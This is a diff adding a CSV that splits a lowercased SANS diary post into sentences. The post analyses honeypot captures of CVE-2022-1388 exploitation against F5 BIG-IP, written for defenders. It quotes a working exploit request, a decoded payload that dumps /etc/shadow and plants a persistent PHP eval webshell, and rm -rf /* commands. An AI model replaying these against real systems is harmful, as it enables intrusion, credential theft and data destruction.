@@ -1,0 +1,123 @@
+Number,Content
+"""Sentence 1","from 0-day to mirai: 7 days of big-ip exploits
+  
+published: 2022-05-13
+last updated: 2022-05-13 14:54:31 utc
+by johannes ullrich (version: 1)
+0 comment(s)
+we all know vulnerabilities have a lifecycle."
+"""Sentence 2","first, they start as closely held secrets, hopefully known to the company producing the vulnerable software."
+"""Sentence 3","after becoming publically known, there is often a mad dash to a public exploit."
+"""Sentence 4","during this phase, security companies often show their skills by hinting at privately developed exploits first until the exploit is publically known."
+"""Sentence 5","once a public exploit is available, the next race starts among adversaries to collect the largest possible market share of vulnerable devices."
+"""Sentence 6","in this stage, some nation-states may attempt to expand their attack network, while at the same time, kids in basements and north korea are looking for coin mining bots."
+"""Sentence 7","oddly enough, they often do not patch the vulnerability, and you end up with devices being exploited repeatedly."
+"""Sentence 8","in the end, you have the crustaceans among the attackers picking apart the crumbs or looking for web shells dropped by others."
+"""Sentence 9","finally, iran and mirai try to see if anything is left for them."
+"""Sentence 10","we saw this in a compressed form with cve-2022-1388, the f5 big-ip remote code execution vulnerability."
+"""Sentence 11","the vulnerability was particular in several ways:
+
+exploitation was trivial once the exploit became known and easily implemented using existing tools."
+"""Sentence 12",an exploit was available very early.
+"""Sentence 13",too early for organizations to roll out the patch in an organized fashion.
+"""Sentence 14",the vulnerable devices were valuable.
+"""Sentence 15",there was a somewhat limited population of exposed and easily exploitable devices.
+"""Sentence 16","we had this cycle play out over about four days:
+
+attacks per day exploiting cve-2022-1388
+
+the first attack probing for post /mgmt/tm/util/bash arrived on may 9th at 2:34 utc:
+
+post /mgmt/tm/util/bash http/1.1
+host: [redacted]
+user-agent: python-requests/2.27.1
+accept: */*
+connection: close, x-f5-auth-token, x-forwarded-for, local
+-ip-from-httpd,x-f5-new-authtok-reqd,x-forwarded-server,x-forwarded-host
+content-type: application/json
+authorization: basic ywrtaw46
+content-length: 46
+
+{command: run, utilcmdargs: -c whoami}
+
+the source ip 185.239.226.177 isn't known for prior attacks, which is interesting."
+"""Sentence 17",it looks like a normal unconfigured windows web server.
+"""Sentence 18","only about half an hour later, we did see the second attack, this time with a bit a more complex payload from 45.72.32.11:
+
+{command: run, utilcmdargs: -c \\echo cmvjag8gij09pt09ijsgcmnhdcavzxrjl2hvc3ruyw1loyakzwnobyaipt09pt0ioyagcmnhdcavzxrjl2hvc3rzoyagcmvjag8gij09pt09ijsgiapjyxqgl2v0yy9wyxnzd2q7icakzwnobyaipt09pt0ioyagcmnhdcavzxrjl3noywrvdzsgiaply2hvici9pt09psi7icaky2f0ic9ldgmvcmvzb2x2lmnvbmy7icakzwnobyaipt09pt0ioyagcmy1bwt1ic1midsgiaply2hvici9pt09psi7icagcmy1bwt1ic1loyagcmvjag8gij09pt09ijsgiapmnw1rdsatwjsgiaply2hvici9pt09psi7icakbw91bnqglw8gihj3lhjlbw91bnqgl3vzcjskdgfyihpjziavdxnyl2xvy2fsl3d3dy94dwkvy29tbw9ul2nzcy8yzjkymznkodqwnmmuy3nzic9jb25mawcvkiavcm9vdc8uymfzaf9oaxn
+0b3j5owply2hvici8p3boccbazxzhbchiyxnlnjrfzgvjb2rlkfwkx1bpu1rbj2y5mjmzzdg0mdynxskpoyigpiavdxnyl2xvy2fsl3d3dy94dwkvy29tbw9ul2nzcy9motizm2q4nda2y3nzlnbocdskzwnobyaizwnobybcijw/cghwie
+bldmfskgjhc2u2nf9kzwnvzguoxfxcjf9qt1nuwydmotizm2q4nda2j10pkttciia+ic91c3ivbg9jywwvd3d3l3h1as9jb21tb24vy3nzl2y5mjmzzdg0mdzjc3mucghwiia+piavy29uzmlnl3n0yxj0dxa7cm1vdw50ic1vihjvlhjlb
+w91bnqgl3vzcjsk|base64 -d > /tmp/f5.sh;/bin/bash /tmp/f5.sh;rm /tmp/f5.sh;\\}
+
+the base64 encoded text decodes to a simple webshell:
+
+echo =====; 
+cat /etc/hostname; 
+echo =====;  
+cat /etc/hosts;  
+echo =====;  
+cat /etc/passwd;  
+echo =====;  
+cat /etc/shadow;  
+echo =====;  
+cat /etc/resolv.conf;  
+echo =====;  
+f5mku -f ;  
+echo =====;   
+f5mku -k;  
+echo =====;  
+f5mku -z;  
+echo =====;  
+mount -o  rw,remount /usr;
+tar zcf /usr/local/www/xui/common/css/2f9233d8406c.css /config/* /root/.bash_history;
+echo <?php @eval(base64_decode(\$_post['f9233d8406'])); > /usr/local/www/xui/common/css/f9233d8406css.php;
+echo echo \<?php @eval(base64_decode(\\\$_post['f9233d8406']));\ > /usr/local/www/xui/common/css/f9233d8406css.php >> /config/startup;
+mount -o ro,remount /usr;
+
+about 4 hours later, we do see attempts to use the webshell from 5 different ips: 93.120.118.131, 178.159.74.190, 192.67.160.144, 216.74.110.226, and 64.43.114.53. indicating that the same actor likely controls these ips."
+"""Sentence 19","it followed many more id, whoami, and similar commands to determine if our system was vulnerable, mixed in with a few webshells, backdoors, and the usual fare."
+"""Sentence 20",only very few attackers attempted to execute anything big-ip specific.
+"""Sentence 21",we got only two or three attackers executing tmsh commands to extract users and password hashes.
+"""Sentence 22","overall, attackers plugged the exploit into existing tools and let it go."
+"""Sentence 23","one of the more interesting sequences of attacks came at 19:04 utc on monday from 177.54.127.111:
+
+ls
+ls /etc/
+ls /run
+rm -rf /*
+rm -rf /*
+ls
+ls /run/
+ls /etc/
+
+the speed of this attack (it took about a minute from beginning to end) makes me believe that this was a manually executed attack."
+"""Sentence 24","the attacker should have noticed that they were dealing with a honeypot but maybe wasn't sure or didn't understand the response, so they killed what they didn't understand with a swift rm -rf /*."
+"""Sentence 25",big-ip mounts the /usr partition read-only.
+"""Sentence 26","this attack would have partially prevented the system from rebooting, but the big-ip software may have continued to work for a while."
+"""Sentence 27","at least two more attempts were made to run rm -rf on our honeypots
+
+overall, this was about it."
+"""Sentence 28",more of the usual.
+"""Sentence 29","this morning, brandon prince, one of our sans.edu interns, reported seeing this malware uploaded to an ssh/telnet honeypot: 
+
+https://www.virustotal.com/gui/file/ccb5b33ad8ae136180aea84c0ef88e5e969039bd3cd6e1ba0b58e19e09a717aa/detection
+
+
+
+it is well detected as mirai, and a simple string search shows the cve-2022-1388 exploit present in the file among the usual payloads bots like mirai are using these days:
+
+
+
+final words (as brad usually says):
+
+you can't survive from patching alone."
+"""Sentence 30",a secure configuration will buy you enough time to apply patches.
+"""Sentence 31","f5 has good guidance, and you should never expose admin interfaces to the internet on any device."
+"""Sentence 32","at this point: assume all vulnerable, exposed f5 big-ip devices have been exploited."
+"""Sentence 33",likely multiple times.
+"""Sentence 34",webshells have been installed.
+"""Sentence 35","do not just look for published iocs, but look for all-new, unusual files and rebuild."
+"""Sentence 36",a more sophisticated attacker may have used the big-ip device to target traffic passing through the device.
+"""Sentence 37","---
+johannes b. ullrich, ph.d. , dean of research, sans.edu
+twitter|"
